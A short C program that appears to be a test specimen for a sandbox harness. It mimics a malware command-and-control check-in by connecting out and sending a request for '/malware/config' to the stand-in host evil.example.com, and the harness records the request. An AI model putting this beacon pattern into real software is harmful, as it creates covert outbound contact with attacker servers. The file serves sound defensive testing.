/* httpbeacon - connects out and sends an HTTP request (like C2 check-in).
 *
 * Under --net simulate the harness redirects the connect to its sink, which
 * answers with a canned HTTP 200; the specimen reads the "response" and the
 * request (method/host/path) is recorded. Under deny/allow-without-route the
 * connect just fails. */
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char **argv) {
    const char *host = (argc > 1) ? argv[1] : "93.184.216.34";
    int port = (argc > 2) ? atoi(argv[2]) : 80;

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(s, (struct sockaddr *)&addr, sizeof addr) != 0) {
        printf("connect failed\n");
        close(s);
        return 1;
    }
    const char *req = "GET /malware/config HTTP/1.0\r\nHost: evil.example.com\r\n\r\n";
    ssize_t w = write(s, req, strlen(req));
    (void)w;

    char buf[512];
    ssize_t n = read(s, buf, sizeof buf - 1);
    if (n > 0) {
        buf[n] = 0;
        char *eol = strchr(buf, '\r');
        if (eol) *eol = 0;
        printf("got %zd bytes: %s\n", n, buf);
    } else {
        printf("no response\n");
    }
    close(s);
    return 0;
}
